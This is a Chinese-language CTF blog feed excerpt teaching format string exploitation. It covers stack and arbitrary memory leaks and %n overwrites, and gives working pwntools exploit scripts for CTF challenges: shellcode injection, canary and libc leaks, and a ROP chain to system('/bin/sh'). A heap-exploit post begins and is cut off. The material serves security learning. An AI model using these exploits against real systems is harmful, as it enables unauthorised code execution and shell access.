id="0x02-格式化字符串漏洞"><a href="#0x02-格式化字符串漏洞" class="headerlink" title="0x02 格式化字符串漏洞"></a>0x02 格式化字符串漏洞</h1><h2 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1.基本原理"></a>1.基本原理</h2><p>先看一个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s %d %s %x %x %x %3$s&quot;,&quot;hello&quot;,123,&quot;x&quot;);</span><br><span class="line">&#x2F;&#x2F;hello 123 x f7fb43dc ffffcfc0 0 x</span><br></pre></td></tr></table></figure><blockquote><p>这里我们可以看到是有7个参数输出，但我们只有3个参数，原因是什么？</p></blockquote><p>可以gdb调试一下</p><p><img src="/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210216115800043.png" alt="image-20210216115800043"></p><p>我们可以看到输出的是图中红框的数</p><p>最后x就是偏移量为3的x</p><p>说明我们对内存已经进行了一定的泄露。</p><p>那么我们如果可以控制格式化字符串，我们就可以进行任意泄露，并通过%n来任意写。</p><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><p>格式化字符串主要有：</p><ol><li>栈数据泄露</li><li>任意地址内存泄露</li><li>栈数据覆盖</li><li>任意地址内存覆盖</li><li>程序崩溃</li></ol><p>首先需要说明一下，在32位和64位系统上传参的方式是有区别的:</p><ul><li><p>32位</p><ul><li>参数从右到左依次压入堆栈，每次压入一个。调用者（caller）必须明确有多少Byte的参数，以便函数返回后清理掉。</li></ul></li><li><p>64位</p><ul><li>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。</li><li>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</li></ul></li></ul><p>因为利用的需要，明确出格式化字符串本身在第几个参数是有必要的，在这里可以使用：</p><blockquote><p>AAAA%n$x</p></blockquote><p>意思是以16位打印第n+1个参数的内容，如果n的数值正确应该返回<code>41414141</code>,0x41正是’A’的ASCII值，如果出现了就可以确认。</p><h3 id="2-1-程序崩溃"><a href="#2-1-程序崩溃" class="headerlink" title="2.1 程序崩溃"></a>2.1 程序崩溃</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s%s%s%s%s%s%s%s&quot;)</span><br></pre></td></tr></table></figure><p>上面这种字符串格式会引起崩溃</p><p>原因有3点</p><ol><li>对于每一个<code>%s</code>printf都需要从栈上获取数字，并将其作为地址，打印指向地址的内存，直到出现空字符</li><li>某个数字不是地址</li><li>获取某个数字是地址，但该地址受保护</li></ol><h3 id="2-2-栈数据泄露"><a href="#2-2-栈数据泄露" class="headerlink" title="2.2 栈数据泄露"></a>2.2 栈数据泄露</h3><h4 id="栈变量的值"><a href="#栈变量的值" class="headerlink" title="栈变量的值"></a><strong>栈变量的值</strong></h4><p>因为该家族函数执行环境都在栈上，所以泄露栈上数据是很自然的。除了首先想到的通过类似于<code>%p%p%p%p...</code>这样打印的方法，还有用<code>%n$[format]</code>这样指定栈上第几个参数的方式。</p><h4 id="栈上的字符串"><a href="#栈上的字符串" class="headerlink" title="栈上的字符串"></a><strong>栈上的字符串</strong></h4><p>%n$s来泄露字符串</p><p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃</strong></p><blockquote><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容</li></ol></blockquote><h3 id="2-3-任意地址内存泄露"><a href="#2-3-任意地址内存泄露" class="headerlink" title="2.3 任意地址内存泄露"></a>2.3 任意地址内存泄露</h3><p>我们用这个主要是通过泄露GOT表，从而获得libc基址，达到getshell</p><p>先看一下这个程序</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  // strtoull</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">128</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(a);</span><br><span class="line">&#125;</span><br><span class="line">AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line"><span class="comment">//AAAA.0xffffcf2c.0xf7fd34a0.0x1.(nil).0x1.0xf7ffd918.0x41414141.0x2e70252e.0x252e7025</span></span><br></pre></td></tr></table></figure><p>看一下调试记录</p><p><img src="/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210216172241585.png" alt="image-20210216172241585"></p><blockquote><p>为什么出现这种情况？</p><p>因为我们的a是可控的，所以在栈上一定有a的地址，也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。</p><p>我们所要做的就是找出a的地址</p><p>也就是相对偏移量</p></blockquote><p>利用下面这种格式，我们就可以得到对应地址的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><p>这里演示一下泄露got表，先看一下重定向表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ readelf -r b</span><br><span class="line"></span><br><span class="line">重定位节 &#39;.rel.dyn&#39; 位于偏移量 0x30c 含有 1 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">重定位节 &#39;.rel.plt&#39; 位于偏移量 0x314 含有 4 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><blockquote><p>由于一些不可见字符的原因，在写地址写入时会被省略</p></blockquote><p>这里用scanf</p><p>建议写脚本运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39;\x18\xa0\x04\x08.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#39;</span><br><span class="line">output：</span><br><span class="line">&#39;\x18\xa0\x04\x08.0xffa9156c.0xf7f314a0.0x1.(nil).0x1.0xf7f5b918.0x804a018.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025&#39;</span><br><span class="line"></span><br><span class="line">p32(0x0804a018) + &quot;%7$s&quot;</span><br><span class="line">output：</span><br><span class="line">&#39;\x18\xa0\x04\x08\xd0\xb0\xe5\xf7&#39;</span><br></pre></td></tr></table></figure><p>我们也就泄露出了got表地址</p><blockquote><p>我们不能直接在命令行输入 \ x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 \,x,0,c 分别作为一个字符进行读入。</p></blockquote><h3 id="2-4-栈数据覆盖"><a href="#2-4-栈数据覆盖" class="headerlink" title="2.4 栈数据覆盖"></a>2.4 栈数据覆盖</h3><p>%n转换指示符<strong>将当前已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量</strong></p><p>我们需要以下几个步骤</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[overwrite addr]....%[overwrite offset]$n</span><br><span class="line"></span><br><span class="line">eg：</span><br><span class="line">p32(xx)+&quot;%012d%7$n&quot;</span><br><span class="line">向xx地址指向地址中写入16</span><br><span class="line">%012d  </span><br><span class="line">%08x</span><br></pre></td></tr></table></figure><h3 id="2-5-任意地址内存覆盖"><a href="#2-5-任意地址内存覆盖" class="headerlink" title="2.5 任意地址内存覆盖"></a>2.5 任意地址内存覆盖</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>根据上面的原理，其实我们直到想在哪里放地址都是可以的</p><p>主要是找到对应的偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">AA%15$nA+p32(xx)</span><br></pre></td></tr></table></figure><h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即<strong>最低有效位存储在低地址</strong>。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x88888888 0x88888888</span><br><span class="line">printf(&quot;%hhn&quot;)  &#x2F;&#x2F;写入单字节0x888888880x88888801</span><br><span class="line">printf(&quot;%hn&quot;)&#x2F;&#x2F;写入双字节0x888888880x88880001</span><br><span class="line">printf(&quot;%n&quot;)&#x2F;&#x2F;写入4字节0x888888880x00000001</span><br><span class="line">printf(&quot;%ln&quot;)&#x2F;&#x2F;写入8字节0x00000000 0x00000001</span><br><span class="line">printf(&quot;%lln&quot;)&#x2F;&#x2F;写入16字节0x00000000 0x00000000 0x00000000 0x00000001</span><br></pre></td></tr></table></figure><p>所以我们可以给对应的地址写入单字节，来获得大数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">&#x2F;&#x2F;偏移量为6</span><br><span class="line">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#39;%6$n&#39;+pad2+&#39;%7$n&#39;+pad3+&#39;%8$n&#39;+pad4+&#39;%9$n&#39;</span><br></pre></td></tr></table></figure><p>这是wiki上的脚本,我们来看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(prev, word, index)</span>:</span> <span class="comment">#prev 之前有多少字母 word 还需要多少 index  偏移</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    fmtstr += <span class="string">"%"</span> + str(index) + <span class="string">"$hhn"</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span><span class="params">(offset, size, addr, target)</span>:</span><span class="comment">#初始偏移量 字节 目标地址 目标值</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = len(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><blockquote><ul><li>offset 表示要覆盖的地址最初的偏移</li><li>size 表示机器字长</li><li>addr 表示将要覆盖的地址。</li><li>target 表示我们要覆盖为的目的变量值</li></ul></blockquote><h1 id="0x03-格式化字符串例题"><a href="#0x03-格式化字符串例题" class="headerlink" title="0x03 格式化字符串例题"></a>0x03 格式化字符串例题</h1><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>虽然说只是新手区，但还是记录一下这道题目</p><p>这道题主要是如何调取shell</p><p>在没有system和/bin/sh，就应该想到用shellcode</p><p>那么shellcode应该往哪里写，又从哪里调用呢</p><p>nx开了，栈上也就不可写了，bss段上也没有什么东西</p><p>那我们往哪里写呢</p><p><img src="/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20201223212813215.png" alt="image-20201223212813215"></p><p>看这里，我们可以在这里写入shellcode</p><p>还有这个题还有一个问题就是利用pwntools生成shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>不同机器汇编代码不同</p><p>贴exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"220.249.52.134"</span>,<span class="number">31872</span>)<span class="comment">#220.249.52.134:31872</span></span><br><span class="line"><span class="comment">#p = process("./string")</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">v4 = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"What should your character's name be:"</span>, <span class="string">'pz1o'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>, <span class="string">'east'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"'Give me an address'"</span>, str(int(v4)))</span><br><span class="line">p.sendlineafter(<span class="string">"And, you wish is:"</span>, <span class="string">'%85c%7$n'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendlineafter(<span class="string">"USE YOU SPELL"</span>, shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>格式化字符串：</p><p>%85c%7$n</p><p>把85写入偏移量为7的地方</p></blockquote><h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>格式化字符串漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>%n</code>，如<code>printf(&quot;abcdefg%n&quot;);</code>,%n前面写了7个字符，所以向ESP（栈顶指针）所指向的地址处所指向的地址处（ESP指向了栈顶，此处存储着一个地址）写入7。</li><li><code>%10$n</code>，与<code>%n</code>类似，不过是向[ESP + 10]处指向的内存处写入7。</li></ul></blockquote><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.134"</span>,<span class="number">47890</span>)</span><br><span class="line">r.recvuntil(<span class="string">"please tell me your name:"</span>)</span><br><span class="line">r.sendline(b<span class="number">'111'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"leave your message please:"</span>)</span><br><span class="line">payload = p32(<span class="number">0x804a068</span>)+b<span class="number">'</span>aaaa%<span class="number">10</span>$n<span class="number">'</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p>格式化字符串泄露canary</p><blockquote><p>这里规定了输入长度</p><p>我们可以用下面来观察我们AA是在第几个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;AA%6$p</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./pwn3.11")</span></span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.232.so")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28762</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3.11"</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt = elf.sym[<span class="string">"puts"</span>]</span><br><span class="line">vuln = elf.sym[<span class="string">"vuln"</span>]</span><br><span class="line">ru(<span class="string">"I'll give u some gift to help u!\n"</span>)</span><br><span class="line">sl(<span class="string">"%7$p"</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400993</span></span><br><span class="line">ret = <span class="number">0x00000000004005f9</span></span><br><span class="line">canary = ru(<span class="string">'00\n'</span>)</span><br><span class="line">canary = int(canary+<span class="string">'00'</span>,<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">"canary"</span>,canary)</span><br><span class="line">pld = <span class="string">b'A'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">b'A'</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class="line">ru(<span class="string">"Pull up your sword and tell me u story!\n"</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">puts = uu64(r(<span class="number">6</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">pld = <span class="string">b'A'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">b'A'</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class="line">ru(<span class="string">"Pull up your sword and tell me u story!\n"</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;总结一下格式化字符串漏洞&lt;/p&gt;
&lt;h1 id=&quot;0x01-格式化输出函数&quot;&gt;&lt;a href=&quot;#0x01-格式化输出函数&quot; class=&quot;headerlink&quot; title=&quot;0x01 格式化输出函数&quot;&gt;&lt;/a&gt;0x01 格式化输出函数&lt;/h1&gt;&lt;p&gt;格式化字符串函数可以</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU(PWN2)---堆</title>
    <link href="https://pz1o.top/2021/02/15/BUU-PWN3-%E5%A0%86/"/>
    <id>https://pz1o.top/2021/02/15/BUU-PWN3-%E5%A0%86/</id>
    <published>2021-02-15T07:32:42.000Z</published>
    <updated>2021-03-08T10:04:01.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="babyheap-0ctf-2017（malloc-hook-onegadget）"><a href="#babyheap-0ctf-2017（malloc-hook-onegadget）" class="headerlink" title="babyheap_0ctf_2017（malloc_hook+onegadget）"></a>babyheap_0ctf_2017（malloc_hook+onegadget）</h2><p>四个功能的堆</p><ul><li>Allocate：分配内存大小并给出 index</li><li>Fill：输入 index ，并分配内存进行内容写入操作</li><li>Free：输入 index ，释放相应的内存空间</li><li>Dump：输入 index ，打印内容</li></ul><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223160414468.png" alt="image-20210223160414468"></p><p>add</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230306738.png" alt="image-20210223230306738"></p><blockquote><p>C 库函数 <strong>void *calloc(size_t nitems, size_t size)</strong> 分配所需的内存空间，并返回一个指向它的指针。<strong>malloc</strong> 和 <strong>calloc</strong> 之间的不同点是，malloc 不会设置内存为零，而 calloc 会设置分配的内存为零。</p></blockquote><p>fill</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230325725.png" alt="image-20210223230325725"></p><blockquote><p>这里size没做限制，可以堆溢出</p></blockquote><p>free</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230340158.png" alt="image-20210223230340158"></p><p>print</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230355914.png" alt="image-20210223230355914"></p><h3 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h3><ol><li>有无限制字节的堆溢出</li></ol><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>这个题主要有两大部分，第一部分是泄露libc基址，第二部分写入one_gadget</p><ol><li>首先要想泄露libc基址，就需要用到一个技巧，主要是unsorted bin 中只有一个块时，它的fd和bk指向同一个地方，并且这个指针相对偏移是固定的，下面有详细操作。因此，我们就需要弄出一个unsorted bin chunk来，并且能够打印其中的内容，也就是经典的伪造chunk，使一个块就可以被打印，同时其中还有fd和bk指针。</li><li>具体该怎么做？首先分配4块fastchunk，1块smallchunk，将中间两块fastchunk释放后，将其fd指针指向smallchunk，这样再分配两块fastchunk，就可以从smallchunk中打印了。接下来把smallchunk进行free即可得到unsorted bin中的fd和bk指针。这样也就得到了libc偏移</li><li>第二部分写入one_gadget,具体就是向malloc_hook写入one_gadget,但这里需要注意偏移问题，因为我们伪造chunksize是7f,所以我们可以找7f的地方。和第一部分一样，主要是改变fastchunk的fd指针指向我们找好的伪造chunk，之后进行再次分配。就可以任意写。</li></ol><h3 id="技巧："><a href="#技巧：" class="headerlink" title="技巧："></a>技巧：</h3><ol><li>获取libc基址通过unsorted bin来获取</li><li>改写malloc_hook，直接one_gadget拿到shell</li></ol><blockquote><p>此题有两个技巧：</p><p>1.通过unsorted bin中fd和bk同时指向main_arena内的信息，来获得libc基址具体，怎么查看减多少，可以看下面</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224003723169.png" alt="image-20210224003723169"></p><p>可以看到fd和bk指向同一个地方，此时查看进程</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224004547238.png" alt="image-20210224004547238"></p><p>找到其中的空间布局（当然可以直接pwndbg中vmmap）</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224004734621.png" alt="image-20210224004734621"></p><p>看libc实际加载地址和fd指针的偏移，这个偏移是固定的</p><figure class="highlight plain"><table><tr><td 